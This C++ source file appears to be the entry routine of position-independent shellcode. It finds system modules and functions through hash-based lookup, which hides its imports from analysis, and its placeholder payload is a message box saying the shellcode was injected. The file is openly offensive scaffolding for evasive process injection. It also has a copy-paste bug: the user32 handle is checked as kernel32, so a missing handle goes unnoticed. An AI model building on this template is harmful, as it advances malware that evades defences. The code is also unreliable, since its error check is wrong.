#include "entry.hpp"

using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);

__attribute__((section(".text.Entry"))) VOID Entry()
{
    // ------------------------------------------------------------------
    // Get modules and functions
    // ------------------------------------------------------------------

    HMODULE hNtdll = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_NTDLL);
    if (!hNtdll)
    {
        return;
    }
    HMODULE hKernel32 = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_KERNEL32);
    if (!hKernel32)
    {
        return;
    }
    HMODULE hUser32 = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_USER32);
    if (!hKernel32)
    {
        return;
    }

    Procs::LPPROC_LDRLOADDLL lpLdrLoadDll = reinterpret_cast<Procs::LPPROC_LDRLOADDLL>(Procs::GetProcAddressByHash(hNtdll, HASH_FUNC_LDRLOADDLL));
    Procs::LPPROC_LOADLIBRARYA lpLoadLibraryA = reinterpret_cast<Procs::LPPROC_LOADLIBRARYA>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYA));
    Procs::LPPROC_MESSAGEBOXA lpMessageBoxA = reinterpret_cast<Procs::LPPROC_MESSAGEBOXA>(Procs::GetProcAddressByHash(hUser32, HASH_FUNC_MESSAGEBOXA));

    // ------------------------------------------------------------------
    // Execute arbitrary function
    // ------------------------------------------------------------------

    lpMessageBoxA(NULL, "Injected shellcode successfully", "", MB_OK);
}